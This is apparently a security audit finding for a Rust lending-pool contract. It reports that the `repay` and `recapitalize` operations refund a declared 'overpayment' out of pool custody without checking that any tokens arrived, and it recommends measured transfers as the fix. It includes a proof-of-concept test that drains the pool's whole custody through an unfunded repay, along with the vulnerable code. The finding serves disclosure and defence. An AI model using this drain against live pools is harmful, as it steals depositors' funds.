### Title
Unmeasured `repay` treats the declared amount as inbound cash and refunds "overpayment" out of pool custody - (File: contracts/pool/src/ops/repay.rs)

### Summary
The pool's `repay` op trusts the declared `action.amount` instead of measuring the actual token transfer in. When the position's outstanding debt is less than the declared amount (including zero debt), the difference is computed as `overpayment` and sent to the caller via `transfer_out`, drawn from the pool's real custody without any corresponding inbound transfer ever being verified. An unprivileged attacker can call `repay` with an arbitrary amount against a zero-debt position and drain real token custody as a "refund" of money they never paid.

### Finding Description
The SQL-injection class maps here as untrusted declared input being executed against shared state: `repay::apply` resolves the repayment entirely from the caller-supplied `action.amount`. In `accounting`, `cache.resolve_repay(amount, position)` splits `amount` into burned debt shares and `overpayment`; when `current_debt_ceil` is zero the full-close branch makes `net_repay == 0` and `overpayment == amount` [1](#0-0) . The `RepayRoundsToZeroShares` assert passes on its `net_repay == 0` disjunct, so the check does not stop the zero-debt case. `apply` then calls `outcome.cache.transfer_out(payer, outcome.overpayment)`, a real token transfer from pool custody to the payer [2](#0-1) . Neither the refund nor `credit_cash` verifies that tokens actually arrived; the doc comment only asserts "The controller transfers the repay amount into the pool before this call" — a trust assumption, not enforcement. The same unmeasured-refund pattern exists in `recapitalize::accounting`, which computes `refund = amount - applied` and refunds it via `transfer_out` [3](#0-2) . The codebase's own test `test_unfunded_repay_overpayment_refund_also_pays_out_of_custody` pins the behavior: a `repay` with nothing transferred in and no debt outstanding refunds the full declared amount out of real custody with the book untouched [4](#0-3) .

### Impact Explanation
Theft of user funds. The attacker declares an amount up to the pool's token custody, performs `repay` against a position with zero (or less) debt, and receives the full "overpayment" in real tokens while `cash` is only credited `net_repay == 0`. Every supplier's balance is backed by that custody, so the payout is a direct loss to depositors; repeated or a single custody-sized call drains the market. The same primitive is available through `recapitalize` when `applied < amount` (i.e., whenever the backing shortfall is smaller than the declared amount), refunding the excess out of custody.

### Likelihood Explanation
A single unprivileged address can reach this path: `repay` is among the externally callable pool actions and requires no privileged role — the test calls `t.client().repay(&payer, ...)` directly with a generated address [5](#0-4) . The preconditions are trivial: any position whose `current_debt_ceil` is below the declared amount, including a market with zero outstanding debt. No oracle manipulation, timing, or privileged access is needed.

### Recommendation
Measure the inbound transfer instead of trusting the declared amount: record the pool's token balance before processing, derive `credited_in = balance_after - balance_before` (the same `transfer_amount_measured` pattern used by the swap aggregator in `contracts/swap-aggregator/src/execute/mod.rs`), and compute `overpayment = credited_in - net_repay` rather than `amount - net_repay`. Alternatively, gate `repay`/`recapitalize` behind the controller address so only flows that provably pull funds first can invoke them, and revert when `net_repay == 0` and no funds arrived.

### Proof of Concept
```rust
// Modeled on contracts/pool/tests/flows.rs::test_unfunded_repay_overpayment_refund_also_pays_out_of_custody
let t = TestSetup::new();                    // market initialized, suppliers funded, no debt
let token = token::Client::new(&t.env, &t.asset);
let payer = Address::generate(&t.env);       // attacker controls no tokens

let custody = token.balance(&t.pool);
// Declared amount = full custody; position debt is zero so the whole amount is "excess".
let credited = t
    .client()
    .repay(&payer, &t.ract(0, custody))      // action.amount = custody, nothing transferred in
    .get_unchecked(0)
    .actual_amount;

assert_eq!(credited, 0);                     // no debt retired
assert_eq!(token.balance(&payer), custody);  // refund paid out of real custody
assert_eq!(token.balance(&t.pool), 0);       // pool drained, books still show full cash
```
The existing test at `contracts/pool/tests/flows.rs:3590-3610` already demonstrates this drain; a variant using `recapitalize(&hub, &payer, &custody)` on a market with `backing_shortfall() < custody` exercises the identical refund gap through `ops/recapitalize.rs`.

```rust
pub(crate) fn accounting(env: &Env, action: &PoolAction) -> RepayOutcome {
    let (mut cache, position) = ops::load_leg(env, action);
    let amount = action.amount;

    let (burned, overpayment) = cache.resolve_repay(amount, position);
    let net_repay = amount
        .checked_sub(overpayment)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));
    assert_with_error!(
        env,
        net_repay == 0 || burned.raw() > 0,
        GenericError::RepayRoundsToZeroShares
    );
```

```rust
pub(crate) fn accounting(
    env: &Env,
    hub_asset: HubAssetKey,
    amount: i128,
) -> RecapitalizationOutcome {
    require_nonneg_amount(env, amount);
    let mut cache = ops::renewed_market(env, &hub_asset);

    let applied = amount.min(guards::backing_shortfall(&cache));
    let refund = amount
        .checked_sub(applied)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));

    cache.credit_cash(applied);
    cache.commit();

    RecapitalizationOutcome {
        cache,
        mutation: PoolAmountMutation {
            actual_amount: applied,
        },
        refund,
    }
```

```rust
#[test]
fn test_unfunded_repay_overpayment_refund_also_pays_out_of_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);

    let custody_before = token.balance(&t.pool);
    let before = t.state_snapshot();
    assert_eq!(
        before.cash, custody_before,
        "fixture guard: book and custody must start in sync"
    );
    assert_eq!(before.borrowed, 0, "fixture must carry no debt");

    // Nothing transferred in, no debt to retire: the whole amount is "excess".
    let credited = t
        .client()
        .repay(&payer, &t.ract(0, custody_before))
        .get_unchecked(0)
        .actual_amount;
    assert_eq!(credited, 0, "no debt was retired, so nothing is credited");
    assert_unfunded_refund_drained_custody(&t, &payer, custody_before, &before);
}
```
